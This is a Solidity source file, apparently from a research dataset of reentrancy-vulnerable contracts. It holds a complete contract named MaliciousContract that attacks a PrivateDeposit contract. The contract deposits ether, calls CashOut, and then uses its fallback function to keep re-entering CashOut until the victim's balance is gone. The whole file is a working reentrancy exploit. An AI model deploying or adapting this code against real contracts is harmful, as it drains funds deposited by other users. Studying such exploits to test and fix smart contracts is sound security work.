pragma solidity ^0.4.19;

import "../dataset/reentrancy/0x7a8721a9d64c74da899424c1b52acbf58ddc9782.sol";

contract MaliciousContract {
    PrivateDeposit privateDeposit;

    constructor(address _victimAddress) public {
        privateDeposit = PrivateDeposit(_victimAddress);
    }

    function attack(uint amount) public  {
        privateDeposit.CashOut(amount);

    }
    function deposit() public payable{
        require(msg.value >= 1 ether, "Must send at least 1 ether");
        privateDeposit.Deposit.value(msg.value)();
    }

    function() payable public {
        // Re-enter the vulnerable function if there's still balance to collect
        if ( address(privateDeposit).balance >= 1 ether) {
            privateDeposit.CashOut(1 ether);
        }
    }


}
